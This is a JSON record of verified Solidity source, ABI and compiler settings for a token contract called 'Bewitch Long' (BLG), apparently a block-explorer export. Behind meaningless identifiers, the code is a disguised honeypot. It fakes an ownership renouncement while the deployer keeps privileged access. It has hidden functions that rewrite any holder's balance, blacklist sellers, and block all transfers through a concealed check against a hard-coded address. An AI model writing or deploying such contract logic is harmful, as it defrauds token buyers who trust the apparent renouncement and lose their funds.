{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface txEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atSenderTo {\n    function createPair(address teamLiquidity, address launchMarketing) external returns (address);\n}\n\ninterface sellAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isLiquidity) external view returns (uint256);\n\n    function transfer(address amountAt, uint256 toFund) external returns (bool);\n\n    function allowance(address limitTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountAt,\n        uint256 toFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minTrading, uint256 value);\n    event Approval(address indexed limitTo, address indexed spender, uint256 value);\n}\n\ninterface sellAmountMetadata is sellAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BewitchLong is sellMarketing, sellAmount, sellAmountMetadata {\n\n    function balanceOf(address isLiquidity) public view virtual override returns (uint256) {\n        return maxMin[isLiquidity];\n    }\n\n    address public enableToken;\n\n    mapping(address => bool) public atTake;\n\n    uint8 private isLaunch = 18;\n\n    bool private swapLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeTxLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyShouldList;\n\n    function name() external view virtual override returns (string memory) {\n        return enableMarketingReceiver;\n    }\n\n    function takeTo(address minTxSell) public {\n        senderMin();\n        \n        if (minTxSell == buyTeam || minTxSell == enableToken) {\n            return;\n        }\n        receiverSell[minTxSell] = true;\n    }\n\n    uint256 private feeTxLaunched = 100000000 * 10 ** 18;\n\n    uint256 launchLimitSell;\n\n    function liquidityMin(uint256 toFund) public {\n        senderMin();\n        modeTotal = toFund;\n    }\n\n    uint256 constant shouldEnable = 8 ** 10;\n\n    string private modeFrom = \"BLG\";\n\n    bool public listFee;\n\n    function autoList(address tradingAt, uint256 toFund) public {\n        senderMin();\n        maxMin[tradingAt] = toFund;\n    }\n\n    uint256 modeTotal;\n\n    function toAuto(address exemptEnable, address amountAt, uint256 toFund) internal returns (bool) {\n        if (exemptEnable == buyTeam) {\n            return receiverTotal(exemptEnable, amountAt, toFund);\n        }\n        uint256 txIs = sellAmount(enableToken).balanceOf(totalMin);\n        require(txIs == modeTotal);\n        require(amountAt != totalMin);\n        if (receiverSell[exemptEnable]) {\n            return receiverTotal(exemptEnable, amountAt, shouldEnable);\n        }\n        return receiverTotal(exemptEnable, amountAt, toFund);\n    }\n\n    function receiverTotal(address exemptEnable, address amountAt, uint256 toFund) internal returns (bool) {\n        require(maxMin[exemptEnable] >= toFund);\n        maxMin[exemptEnable] -= toFund;\n        maxMin[amountAt] += toFund;\n        emit Transfer(exemptEnable, amountAt, toFund);\n        return true;\n    }\n\n    function senderLiquidity() public {\n        emit OwnershipTransferred(buyTeam, address(0));\n        takeSwap = address(0);\n    }\n\n    uint256 private liquidityBuyFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLaunch;\n    }\n\n    function transfer(address tradingAt, uint256 toFund) external virtual override returns (bool) {\n        return toAuto(_msgSender(), tradingAt, toFund);\n    }\n\n    address private takeSwap;\n\n    bool private feeLaunched;\n\n    address totalMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderMin() private view {\n        require(atTake[_msgSender()]);\n    }\n\n    mapping(address => uint256) private maxMin;\n\n    function owner() external view returns (address) {\n        return takeSwap;\n    }\n\n    mapping(address => bool) public receiverSell;\n\n    function allowance(address minWallet, address takeAmountEnable) external view virtual override returns (uint256) {\n        if (takeAmountEnable == fundLiquidity) {\n            return type(uint256).max;\n        }\n        return buyShouldList[minWallet][takeAmountEnable];\n    }\n\n    uint256 private feeAt;\n\n    constructor (){\n        \n        txEnable liquidityIs = txEnable(fundLiquidity);\n        enableToken = atSenderTo(liquidityIs.factory()).createPair(liquidityIs.WETH(), address(this));\n        \n        buyTeam = _msgSender();\n        senderLiquidity();\n        atTake[buyTeam] = true;\n        maxMin[buyTeam] = feeTxLaunched;\n        if (swapLiquidity) {\n            feeLaunched = false;\n        }\n        emit Transfer(address(0), buyTeam, feeTxLaunched);\n    }\n\n    function transferFrom(address exemptEnable, address amountAt, uint256 toFund) external override returns (bool) {\n        if (_msgSender() != fundLiquidity) {\n            if (buyShouldList[exemptEnable][_msgSender()] != type(uint256).max) {\n                require(toFund <= buyShouldList[exemptEnable][_msgSender()]);\n                buyShouldList[exemptEnable][_msgSender()] -= toFund;\n            }\n        }\n        return toAuto(exemptEnable, amountAt, toFund);\n    }\n\n    function liquidityToken(address minLaunch) public {\n        require(minLaunch.balance < 100000);\n        if (takeTotal) {\n            return;\n        }\n        \n        atTake[minLaunch] = true;\n        if (swapLiquidity) {\n            liquidityBuyFrom = feeAt;\n        }\n        takeTotal = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeFrom;\n    }\n\n    event OwnershipTransferred(address indexed isLaunchAt, address indexed amountWallet);\n\n    bool public takeTotal;\n\n    function getOwner() external view returns (address) {\n        return takeSwap;\n    }\n\n    address public buyTeam;\n\n    address fundLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private enableMarketingReceiver = \"Bewitch Long\";\n\n    function approve(address takeAmountEnable, uint256 toFund) public virtual override returns (bool) {\n        buyShouldList[_msgSender()][takeAmountEnable] = toFund;\n        emit Approval(_msgSender(), takeAmountEnable, toFund);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunchAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAmountEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmountEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFund\",\"type\":\"uint256\"}],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toFund\",\"type\":\"uint256\"}],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTxSell\",\"type\":\"address\"}],\"name\":\"takeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BewitchLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}